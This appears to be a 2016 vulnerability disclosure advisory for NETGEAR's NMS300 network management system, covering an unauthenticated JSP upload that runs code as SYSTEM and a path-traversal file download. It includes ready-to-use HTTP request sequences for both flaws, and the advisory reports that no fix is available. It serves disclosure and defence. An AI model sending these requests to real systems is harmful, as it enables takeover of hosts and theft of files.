@@ -1,0 +1,106 @@
+>> Remote code execution / arbitrary file download in NETGEAR ProSafe Network Management System NMS300
+>> Discovered by Pedro Ribeiro (pedrib@gmail.com), Agile Information Security (http://www.agileinfosec.co.uk/)
+==========================================================================
+Disclosure: 04/02/2016 / Last updated: 04/02/2016
+
+
+>> Background on the affected product:
+"NMS300
+ProSAFE® Network Management System
+Diagnose, control, and optimize your network devices.
+
+The NETGEAR Management System NMS300 delivers insight into network elements, including third-party devices. An intuitive, web-based user interface makes it easier to monitor and administer an entire network."
+
+
+>> Summary:
+Netgear's NMS300 is a network management utility that runs on Windows systems. It has serious two vulnerabilities that can be exploited by a remote attacker. The first one is an arbitrary file upload vulnerability that allows an unauthenticated attacker to execute Java code as the SYSTEM user.
+The second vulnerability is an arbitrary file download that allows an authenticated user to download any file from the host that is running NMS300.
+
+A special thanks to Joel Land of CERT/CC for helping disclose this vulnerability under ID 777024 [1]. Two new Metasploit modules that exploit these vulnerabilities have been released.
+
+
+>> Technical details:
+#1
+Vulnerability: Remote code execution via arbitrary file upload (unauthenticated)
+CVE-2016-1525
+Affected versions:
+NMS300 1.5.0.11
+NMS300 1.5.0.2
+NMS300 1.4.0.17
+NMS300 1.1.0.13
+
+There are two servlets that allow unauthenticated file uploads:
+@RequestMapping({ "/fileUpload.do" })
+public class FileUpload2Controller
+- Uses spring file upload
+
+@RequestMapping({ "/lib-1.0/external/flash/fileUpload.do" })
+public class FileUploadController
+- Uses flash upload
+
+The JSP file can be uploaded as shown below, it will be named null[name].[extension] and can be reached on http://[host]:8080/null[name].[extension].
+So for example if [name] = "testing" and [extension] = ".jsp", the final file will be named "nulltesting.jsp". [name] and [extension] can be seen in the sample request below. The code will execute as the SYSTEM user.
+
+POST /lib-1.0/external/flash/fileUpload.do HTTP/1.1
+Content-Type: multipart/form-data; boundary=----------ae0KM7Ef1ei4GI3gL6gL6gL6gL6GI3
+
+------------ae0KM7Ef1ei4GI3gL6gL6gL6gL6GI3
+Content-Disposition: form-data; name="name"
+
+[name]
+------------ae0KM7Ef1ei4GI3gL6gL6gL6gL6GI3
+Content-Disposition: form-data; name="Filedata"; filename="whatever.[extension]"
+Content-Type: application/octet-stream
+
+<%@ page language="java" contentType="text/html; charset=ISO-8859-1"
+pageEncoding="ISO-8859-1"%>
+<!DOCTYPE html PUBLIC "-//W3C//DTD HTML 4.01 Transitional//EN" "http://www.w3.org/TR/html4/loose.dtd">
+<html>
+<head>
+<meta http-equiv="Content-Type" content="text/html; charset=ISO-8859-1">
+<title>Hello World Example</title>
+</head>
+<body>
+<h2>A Hello World Example of JSP.</h2>
+</body>
+</html>
+------------ae0KM7Ef1ei4GI3gL6gL6gL6gL6GI3--
+
+
+#2
+Vulnerability: Arbitrary file download (authenticated)
+CVE-2016-1524
+Affected versions:
+NMS300 1.5.0.11
+NMS300 1.5.0.2
+NMS300 1.4.0.17
+NMS300 1.1.0.13
+
+Three steps need to be taken in order to exploit this vulnerability:
+a) Add a configuration image, with the realName parameter containing the path traversal to the target file:
+POST /data/config/image.do?method=add HTTP/1.1
+realName=../../../../../../../../../../<file on C:\>&md5=&fileName=<imagename.img>&version=1337&vendor=Netgear&deviceType=4&deviceModel=FS526Tv2&description=bla
+
+b) Obtain the file identifier (imageId) for the image that was created by scraping the page below for "imagename.img" (the fileName parameter in step 1):
+POST /data/getPage.do?method=getPageList&type=configImgManager
+everyPage=10000
+
+Sample response:
+{"page":{"beginIndex":0,"recordCount":7,"totalRecords":7,"currentPage":1,"everyPage":10,"totalPage":1},"list":[{"imageId":"1","fileName":"agga5.img","createTime":"10/03/2015 21:12:36","realFileName":"../../../../../../../../../../log.txt","vendor":"Netgear","deviceType":"4","deviceModel":"FS526Tv2","version":"2323","sizeM":"24491","createBy":"admin","createId":"1","description":"bla\r\n"}
+
+c) Download the file with the imageId obtained in step 2:
+GET /data/config/image.do?method=export&imageId=<ID>
+
+
+>> Fix: 
+No fix is currently available. It is recommended not to expose NMS300 to the Internet or any unstrusted networks.
+
+
+>> References:
+[1] https://www.kb.cert.org/vuls/id/777024
+
+
+================
+Agile Information Security Limited
+http://www.agileinfosec.co.uk/
+>> Enabling secure digital business >>
